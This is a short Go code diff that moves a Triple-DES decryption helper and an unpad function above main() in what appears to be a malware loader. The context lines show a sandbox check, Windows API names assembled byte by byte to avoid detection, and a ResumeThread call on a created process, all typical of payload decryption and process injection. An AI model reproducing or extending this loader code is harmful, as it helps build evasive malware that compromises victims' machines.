@@ -190,6 +190,22 @@ func zzzh() {
 }
 
 
+func decryptDES3(ciphertext, key, iv []byte) []byte {
+    block, _ := des.NewTripleDESCipher(key)
+    mode := cipher.NewCBCDecrypter(block, iv)
+
+    decrypted := make([]byte, len(ciphertext))
+    mode.CryptBlocks(decrypted, ciphertext)
+
+    decrypted = unpad(decrypted)
+
+    return decrypted
+}
+func unpad(data []byte) []byte {
+	padding := int(data[len(data)-1])
+	return data[:len(data)-padding]
+}
+
 func main() {
 
     if CheckSandbox() {
@@ -260,21 +276,4 @@ func main() {
 	})).MustFindProc(string([]byte{
 		'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 
 	})).Call(uintptr(processInfo.Thread))
-}
-
-
-func decryptDES3(ciphertext, key, iv []byte) []byte {
-    block, _ := des.NewTripleDESCipher(key)
-    mode := cipher.NewCBCDecrypter(block, iv)
-
-    decrypted := make([]byte, len(ciphertext))
-    mode.CryptBlocks(decrypted, ciphertext)
-
-    decrypted = unpad(decrypted)
-
-    return decrypted
-}
-func unpad(data []byte) []byte {
-	padding := int(data[len(data)-1])
-	return data[:len(data)-padding]
 }
